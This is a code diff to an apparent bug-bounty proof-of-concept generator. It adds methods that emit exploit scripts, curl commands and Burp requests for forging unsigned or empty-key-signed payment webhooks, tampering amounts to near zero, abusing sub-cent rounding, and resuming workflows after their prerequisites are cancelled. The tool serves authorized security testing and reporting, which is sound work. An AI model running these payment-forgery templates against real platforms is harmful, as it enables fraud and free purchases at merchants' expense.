@@ -53,6 +53,14 @@ class PoCGenerator:
             return self._poc_enumeration(finding)
         elif "bopla" in cat or "property" in cat:
             return self._poc_bopla(finding)
+        elif "webhook" in cat or "callback" in cat:
+            return self._poc_webhook_bypass(finding)
+        elif "numeric precision" in cat or "rounding" in cat or "scale confusion" in cat:
+            return self._poc_numeric_precision(finding)
+        elif "second-order" in cat or "second order" in cat:
+            return self._poc_second_order(finding)
+        elif "stale precondition" in cat or "resumption" in cat:
+            return self._poc_stale_precondition(finding)
         else:
             return self._poc_generic(finding)
 
@@ -1106,6 +1114,242 @@ for probe in [
             expected_result="Response contains additional fields not present in the baseline response. Sensitive fields (e.g. internal notes, admin flags, hashed credentials) may be exposed.",
             steps=steps,
             video_note="Show the normal response, then the expanded response with new fields highlighted.",
+        )
+
+    def _poc_webhook_bypass(self, f: Finding) -> ProofOfConcept:
+        req = f.request
+        url = req.get("url", "")
+        body = req.get("body", {})
+        tamper_note = req.get("note", "no signature header")
+
+        python = self._python_script_header() + f'''
+import hmac, hashlib, json
+
+TARGET = "{url}"
+BODY = {json.dumps(body, indent=4)}
+BODY_BYTES = json.dumps(BODY, separators=(",", ":")).encode()
+
+# Step 1 — fire without any signature header
+r1 = session.post(TARGET, json=BODY, headers={{"Content-Type": "application/json"}}, verify=False)
+print(f"[NO SIGNATURE] Status: {{r1.status_code}}")
+print(f"Response: {{r1.text[:300]}}")
+if r1.status_code in (200, 201):
+    print("\\n[!!!] WEBHOOK BYPASS CONFIRMED — no signature enforced")
+
+# Step 2 — fire with HMAC computed from an empty key (guessable key test)
+sig = hmac.new(b"", BODY_BYTES, hashlib.sha256).hexdigest()
+r2 = session.post(
+    TARGET, json=BODY,
+    headers={{"Content-Type": "application/json", "x-hub-signature-256": f"sha256={{sig}}"}},
+    verify=False,
+)
+print(f"\\n[EMPTY-KEY SIG] Status: {{r2.status_code}}")
+if r2.status_code in (200, 201):
+    print("[!!!] EMPTY-KEY SIGNATURE ACCEPTED")
+
+# Step 3 — tamper the amount to 1 (effectively free) and re-fire
+tampered = dict(BODY)
+for k in list(tampered.keys()):
+    if any(a in k.lower() for a in ("amount", "total", "price", "charge")):
+        tampered[k] = 1
+        break
+r3 = session.post(TARGET, json=tampered, headers={{"Content-Type": "application/json"}}, verify=False)
+print(f"\\n[AMOUNT=1] Status: {{r3.status_code}}")
+if r3.status_code in (200, 201):
+    print("[!!!] FORGED PAYMENT AT AMOUNT=1 ACCEPTED — effectively free purchase")
+'''
+
+        steps = [
+            f"1. Identify the callback endpoint at `{url}` — this is where your platform receives payment events",
+            "2. Without any signature header, POST the body below and observe a success response",
+            "3. Confirm by checking the resulting order/transaction record — the platform processed it as legitimate",
+            "4. Try the amount-tamper variant: set `amount=1` in the body and refire — the platform should process a 'paid' event for 1 minor unit",
+            "5. Impact: an attacker can mark any order as paid without actually paying",
+        ]
+
+        return ProofOfConcept(
+            summary=f"Forged payment callback accepted — {tamper_note}",
+            curl_command=(
+                f'curl -sk -X POST "{url}" \\\n'
+                f'  -H "Content-Type: application/json" \\\n'
+                f"  -d '{json.dumps(body)}'"
+            ),
+            python_script=python,
+            burp_request=self._burp_request("POST", url, body),
+            expected_result="HTTP 200/201 on the unsigned/forged body. Cross-check the resulting order/payment record to confirm the platform treated it as a completed payment.",
+            steps=steps,
+            video_note="Show the forged POST request and the resulting order record marked as 'paid'. Demonstrate with a real (test-mode) checkout flow if the program allows it.",
+        )
+
+    def _poc_numeric_precision(self, f: Finding) -> ProofOfConcept:
+        req = f.request
+        url = req.get("url", "")
+        method = req.get("method", "POST")
+        body = req.get("body", {})
+        field = req.get("field", "amount")
+        payload = req.get("payload", 0.0049)
+        token = self.config.auth_token
+
+        python = self._python_script_header() + f'''
+TARGET = "{url}"
+HEADERS = {{
+    "Authorization": "Bearer {token}",
+    "Content-Type": "application/json",
+}}
+
+# Baseline
+normal_body = {json.dumps(body, indent=4)}
+r1 = session.request("{method}", TARGET, json=normal_body, headers=HEADERS)
+print(f"[BASELINE] Status: {{r1.status_code}}")
+try:
+    import json as _j
+    print(f"[BASELINE] Amount/total: {{_j.loads(r1.text).get('total', _j.loads(r1.text).get('amount', 'N/A'))}}")
+except Exception:
+    print(f"[BASELINE] Body: {{r1.text[:200]}}")
+
+# Precision attack — set the field to a sub-cent value
+tampered_body = dict(normal_body)
+tampered_body["{field}"] = {payload!r}
+r2 = session.request("{method}", TARGET, json=tampered_body, headers=HEADERS)
+print(f"\\n[PRECISION TAMPER] Status: {{r2.status_code}}")
+try:
+    resp = _j.loads(r2.text)
+    total = resp.get("total", resp.get("amount", resp.get("grand_total")))
+    print(f"[PRECISION TAMPER] Echoed total/amount: {{total}}")
+    if total is not None and float(str(total)) < 0.01:
+        print("[!!!] CONFIRMED — backend computed an effectively-free total")
+    elif r2.status_code in (200, 201):
+        print("[?] Accepted — manually check the resulting order record for the charged amount")
+except Exception:
+    print(f"[PRECISION TAMPER] Body: {{r2.text[:300]}}")
+'''
+
+        steps = [
+            f"1. Send a normal `{method}` request to `{url}` and note the total/amount in the response",
+            f"2. Set `{field}` to `{payload}` — this is a sub-cent value that passes a `value > 0` guard",
+            "3. If the response echoes a `total` or `amount` near zero, the backend is rounding client-submitted values",
+            "4. Cross-check the resulting order/invoice: if it shows a near-zero charge, this is confirmed exploitable",
+            "5. Multiply by quantity if applicable — many items × 0.004 may still round to 0.00",
+        ]
+
+        return ProofOfConcept(
+            summary=f"Sub-cent precision abuse on `{field}` — backend computes free or near-free total",
+            curl_command=self._curl_base(method, url, {**body, field: payload}),
+            python_script=python,
+            burp_request=self._burp_request(method, url, {**body, field: payload}),
+            expected_result=f"The response echoes a total/amount near zero, or the resulting order record shows a charge of 0.00. Baseline response shows the full amount.",
+            steps=steps,
+            video_note="Show the baseline order total, then the tampered order total — especially any confirmation email or receipt that reflects the final charged amount.",
+        )
+
+    def _poc_second_order(self, f: Finding) -> ProofOfConcept:
+        req = f.request
+        url = req.get("url", "")
+        method = req.get("method", "GET")
+        field = f.parameter or "unknown_field"
+        token = self.config.auth_token
+
+        python = self._python_script_header() + f'''
+# Second-Order State Reflection PoC
+# This requires two steps:
+# 1. Trigger the original tamper (the confirmed finding that BLFinder observed)
+# 2. Then read THIS endpoint and show the tampered value crossed over
+TARGET = "{url}"
+HEADERS = {{
+    "Authorization": "Bearer {token}",
+    "Content-Type": "application/json",
+}}
+
+# Step 2 (read the cross-endpoint effect):
+r = session.request("{method}", TARGET, headers=HEADERS)
+print(f"Status: {{r.status_code}}")
+try:
+    import json as _j
+    data = _j.loads(r.text)
+    def dig(obj, key):
+        if isinstance(obj, dict):
+            if key in obj: return obj[key]
+            for v in obj.values():
+                found = dig(v, key)
+                if found is not None: return found
+        elif isinstance(obj, list):
+            for item in obj:
+                found = dig(item, key)
+                if found is not None: return found
+        return None
+    val = dig(data, "{field}")
+    print(f"[CROSS-ENDPOINT] `{field}` = {{val}}")
+    if val not in (None, False, 0, "", "0", "false"):
+        print("[!!!] SECOND-ORDER REFLECTION CONFIRMED — tampered state leaked to this endpoint")
+except Exception:
+    print(r.text[:400])
+'''
+
+        steps = [
+            "1. First trigger the original confirmed tamper (see the finding that BLFinder already confirmed — look for the companion finding about the same field on a different endpoint)",
+            f"2. After that tamper, read this endpoint: `{method} {url}`",
+            f"3. Observe `{field}` appears with a non-trivial value — the state set at the tamper endpoint was stored and is now trusted here without re-validation",
+            "4. Confirm the original tamper was the cause by repeating without the tamper first — the field should be absent or trivial",
+        ]
+
+        return ProofOfConcept(
+            summary=f"Second-order: `{field}` tampered at one endpoint, appears at `{url}`",
+            curl_command=self._curl_base(method, url),
+            python_script=python,
+            burp_request=self._burp_request(method, url),
+            expected_result=f"`{field}` appears with the value set by the original tamper, not the legitimate server-computed value.",
+            steps=steps,
+            video_note="Record two runs side by side: without the tamper and with it. Show the cross-endpoint effect in the read response.",
+        )
+
+    def _poc_stale_precondition(self, f: Finding) -> ProofOfConcept:
+        req = f.request
+        url = req.get("url", "")
+        method = req.get("method", "POST")
+        body = req.get("body", {})
+        note = req.get("note", "invalidated resource")
+        token = self.config.auth_token
+
+        python = self._python_script_header() + f'''
+# Workflow Resumption After Invalidation PoC
+TARGET = "{url}"
+HEADERS = {{
+    "Authorization": "Bearer {token}",
+    "Content-Type": "application/json",
+}}
+BODY = {json.dumps(body, indent=4)}
+
+# IMPORTANT: Before running this, complete the flow up to the step that
+# creates the resource (see the finding evidence for which step and which
+# identifier it produced), then cancel/delete that resource out of band,
+# THEN run this request.
+
+r = session.request("{method}", TARGET, json=BODY, headers=HEADERS)
+print(f"Status: {{r.status_code}}")
+print(f"Response: {{r.text[:400]}}")
+
+if r.status_code in (200, 201):
+    print("\\n[!!!] STALE PRECONDITION CONFIRMED")
+    print("[!!!] This step succeeded even though the prerequisite resource was cancelled/deleted")
+    print("[!!!] The server is trusting flow position rather than re-checking current resource state")
+'''
+
+        steps = [
+            "1. Run the multi-step flow up to the step that creates the identifier (see the finding evidence for which step)",
+            "2. Out of band, cancel or delete that resource (DELETE or PATCH status=cancelled)",
+            f"3. Resume the flow: send `{method} {url}` with the body below",
+            "4. Observe it still returns HTTP 200/201 — the server trusted that reaching this step means every precondition still holds",
+            f"5. Check downstream impact: {note}",
+        ]
+
+        return ProofOfConcept(
+            summary=f"Flow step succeeds after prerequisite resource was invalidated — stale precondition",
+            curl_command=self._curl_base(method, url, body),
+            python_script=python,
+            burp_request=self._burp_request(method, url, body),
+            expected_result="HTTP 200/201 on this step even though the resource it depends on was cancelled/deleted before this request was sent.",
+            steps=steps,
+            video_note="Show the flow running normally, then the cancellation, then the resume step still succeeding. Show the downstream order/state record.",
         )
 
     def _poc_generic(self, f: Finding) -> ProofOfConcept:
